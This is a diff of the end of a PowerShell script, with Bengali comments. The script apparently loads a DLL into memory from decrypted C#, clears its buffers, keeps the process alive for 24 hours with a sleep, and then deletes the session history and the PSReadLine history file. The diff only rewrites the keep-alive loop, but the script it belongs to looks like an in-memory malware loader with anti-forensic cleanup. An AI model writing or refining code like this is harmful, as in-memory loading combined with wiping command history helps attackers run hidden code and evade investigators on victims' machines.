@@ -151,20 +151,18 @@ $bytes = $null
 $plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
-Write-Host "[+] Done. DLL is running in memory." -ForegroundColor Cyan
+Write-Host "[+] DLL successfully loaded. Keeping PowerShell alive for 24 hours." -ForegroundColor Cyan
 
 # ================================================================
-#  ★★★ ৫. ২৪ ঘন্টা চালু রাখার লুপ (PowerShell বন্ধ হবে না) ★★★
+#  ★★★ ৫. ২৪ ঘন্টা চালু রাখার জন্য সোজা স্লিপ ★★★
 # ================================================================
-$endTime = (Get-Date).AddHours(24)
-while ((Get-Date) -lt $endTime) {
-    Start-Sleep -Seconds 60   # প্রতি ১ মিনিটে একবার চেক করবে
-}
-Write-Host "[+] 24 hours completed. Exiting now." -ForegroundColor Yellow
+Start-Sleep -Seconds 86400   # 24 hours
 
-# (ঐচ্ছিক) ক্লিনআপ – হিস্ট্রি মুছবে না, যাতে প্রক্রিয়া বন্ধ না হয়
+# ক্লিনআপ (ঐচ্ছিক) – লুপের পর একবার হালকা ক্লিন
 Clear-History
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
 if (Test-Path $historyPath) {
-    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
+    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
 }
+
+Write-Host "[+] 24 hours completed. Script ending." -ForegroundColor Yellow
